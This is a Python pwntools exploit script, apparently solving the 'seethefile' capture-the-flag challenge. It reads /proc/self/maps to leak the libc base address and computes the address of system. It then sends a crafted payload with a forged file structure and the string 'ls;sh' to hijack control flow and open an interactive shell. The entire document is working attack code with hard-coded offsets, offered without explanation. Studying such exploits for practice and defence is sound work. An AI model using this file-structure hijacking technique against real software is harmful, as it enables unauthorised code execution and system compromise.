from pwn import *

io=process("./seethefile")


def open():
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("What do you want to see :","/proc/self/maps")

def read_write():
    io.sendlineafter("Your choice :","2")
    io.sendlineafter("Your choice :","3")

open()
read_write()
read_write()
io.recvline()
io.recvline()
io.recvline()
#io.recvline()
leak=io.recv(8)

leak=int(leak,16)
print hex(leak)
io.sendlineafter("Your choice :","5")

libc_base=leak-0x16d000
one=libc_base+0x5fbc6
system=libc_base+0x3ada0+0x7e60
#p32(0x804b670)
pay=p32(0x804b264)+"ls;"+"sh\x00\x00\x00"+"a"*20+p32(0x804b260)+"\x00"*112+p32(0x804b2f4)+"\x00"*0x40+p32(system)
gdb.attach(io)
io.sendlineafter("Leave your name :",pay)
io.interactive()
